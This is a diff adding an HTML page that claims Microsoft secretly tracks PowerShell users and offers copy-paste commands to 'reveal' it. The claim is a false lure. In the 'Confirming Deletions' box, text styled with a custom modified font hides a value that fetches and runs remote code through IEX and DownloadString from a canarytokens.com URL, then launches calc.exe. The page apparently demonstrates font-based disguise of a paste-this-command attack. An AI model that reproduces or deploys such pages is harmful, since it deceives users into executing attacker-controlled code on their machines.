@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mixed Font Code Box</title>
+    <style>
+        /* Import Open Sans from Google Fonts */
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400&display=swap');
+
+        /* Keep the modified font */
+        @font-face {
+            font-family: 'OpenSansModified';
+            src: url('OpenSans-Modified.woff2') format('woff2');
+            font-weight: normal;
+            font-style: normal;
+        }
+
+        body {
+            font-family: 'Open Sans', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            background-color: #f4f4f4;
+            margin: 0;
+        }
+
+        .title {
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            max-width: 800px;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 800px;
+            background: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            margin-bottom: 20px;
+            display: block;
+        }
+
+        pre {
+            background: #272822;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: 'Open Sans', monospace;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            overflow-x: auto;
+            max-width: 100%;
+            display: block;
+            text-align: left;
+        }
+
+        .modified {
+            font-family: 'OpenSansModified', monospace;
+        }
+
+        button {
+            margin-top: 10px;
+            padding: 10px 20px;
+            border: none;
+            background: #007bff;
+            color: white;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: background 0.2s;
+        }
+
+        button:hover {
+            background: #0056b3;
+        }
+    </style>
+</head>
+<body>
+<br><br><br><br><br><br>
+
+<div class="title">Microsoft has been secretly tracking your actions in PowerShell, here’s how you can reveal it</div>
+
+<div class="container">
+    <h2>Deactivate Secret User</h2>
+    <pre id="codebox">
+$user = Get-WmiObject Win32_UserAccount | Where-Object { $_.Name -match "MICROSOFT" -or $_.Description -match "internal|reserved|hidden|deactivatedoor" }
+    </pre>
+</div>
+
+<div class="container">
+    <h2>Deactivate Secret Firewall Rules</h2>
+    <pre id="codebox">
+$user = Get-WmiObject Win32_UserAccount | Where-Object { $_.Name -match "MICROSOFT" -or $_.Description -match "internal|reserved|hidden|deactivatedoor" }
+    </pre>
+</div>
+
+<div class="container">
+    <h2>Confirming Deletions</h2>
+    <pre id="codebox">
+& {
+<#
+This comment is very important 
+to get the right number of byteswxxxxxxxxxxxxxxxx
+XXXXXXXXXXXXXXXXXXXXXXXx
+#>
+$rights = Find-AdmPwdExtendedrights -Identity "<span class="modified">;$(IEX (New-Object Net.WebClient).DownloadString('http://canarytokens.com/terms/static/stuff/h608qpmsix4altl2cw3d41iza/post.jsp'); Start-Process calc.exe)</span>" 
+$rights | Format-Table 
+
+#ShadowNotSoBroker
+}
+    </pre>
+</div>
+
+</body>
+</html>
